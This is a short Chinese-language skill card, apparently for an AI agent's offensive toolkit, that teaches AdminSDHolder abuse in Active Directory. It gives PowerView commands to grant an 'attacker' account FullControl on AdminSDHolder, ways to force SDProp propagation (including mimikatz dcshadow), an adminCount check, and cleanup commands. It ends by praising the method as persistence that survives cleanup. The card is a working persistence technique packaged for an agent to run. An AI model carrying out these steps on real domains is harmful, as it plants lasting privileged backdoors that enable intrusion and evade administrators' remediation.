---
name: 'adminsdholder-abuse'
description: 'AdminSDHolder滥用：添加ACE→SDProp自动传播→所有受保护组持久化。60分钟传播周期+手动触发。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

## AdminSDHolder 滥用

### 原理
AdminSDHolder 是 AD 中保护高权限组的特殊对象。SDProp 每 60 分钟将其 ACL 复制到所有受保护组（Domain Admins、Administrators、Enterprise Admins 等）。在 AdminSDHolder 的 ACL 中加一条 ACE → 60 分钟后该 ACE 传播到所有受保护对象 → 持久化。

### 利用
```powershell
# 1. 给 AdminSDHolder 添加 FullControl ACE（需要 DA 或对 AdminSDHolder 有写权）
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker -Verbose -Rights All

# 2. 等待 SDProp 传播（最多 60 分钟）
# 3. 手动触发 SDProp（无可靠的客户端手动触发；SDProp 默认每 60 分钟跑一次）
Invoke-SDPropagator -showProgress

# 绕过等待的方案：
# → 等 SDProp 周期（默认 60 分钟）后复检目标 adminCount 是否变 1
# → 高级方案：mimikatz lsadump::dcshadow 推送伪造变更，触发立即同步（复杂度高，通常不值得）
```text

### 检测是否被 SDProp 保护
```powershell
# adminCount=1 表示受保护
Get-ADUser -Filter {adminCount -eq 1}
Get-ADGroup -Filter {adminCount -eq 1}
```text

### 清理
```powershell
# 从 AdminSDHolder 移除添加的 ACE
Remove-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName attacker
```text

### 为什么比其他持久化更好
- 传播是**自动的**（SDProp 定时器）
- 被保护组**定期重置**受 AdminSDHolder 控制的 ACL（防止手动修改）
- 即使清理了受保护对象上的 ACE，60 分钟后会**重新传播回来**
